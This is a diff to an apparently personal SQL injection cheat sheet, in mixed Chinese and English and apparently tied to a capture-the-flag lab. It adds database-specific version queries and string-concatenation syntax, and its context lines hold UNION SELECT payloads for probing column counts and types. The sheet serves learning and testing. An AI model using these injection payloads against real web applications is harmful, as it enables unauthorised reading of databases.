@@ -343,7 +343,10 @@ Hacker                                                             website.thm  
     * 用%26取代
   * = => LIKE
   * LIMIT 0,1 => LIMIT 1 OFFSET 0
-* `@@version` : 同`version()`，回傳資料庫版本
+* Examine Database
+  * Microsoft, MySQL: `SELECT @@version`
+  * Oracle: `SELECT * FROM v$version`
+  * PostgreSQL: `SELECT version()`
 * `user()` : 回傳使用者名稱
 * `database()`: Get database name
 * Determine number of columns
@@ -359,6 +362,11 @@ Hacker                                                             website.thm  
   * `' UNION SELECT 'a',NULL,NULL--`
   * `' UNION SELECT NULL,'a',NULL--`
   * `' UNION SELECT NULL,NULL,'a'--`
+* Retrieving multiple values with a single column
+  * Oracle: `'foo'||'bar'`
+  * Microsoft: `'foo'+'bar'`
+  * PostgreSQL: `'foo'||'bar'`
+  * MySQL: `'foo' 'bar'`, `CONCAT('foo','bar')`
 * `information_schema`
   * SQL內建的資料庫，會儲存資料庫內部的資訊，例如所有table/column name
   * 透過leak information_schema取得想要的資料庫
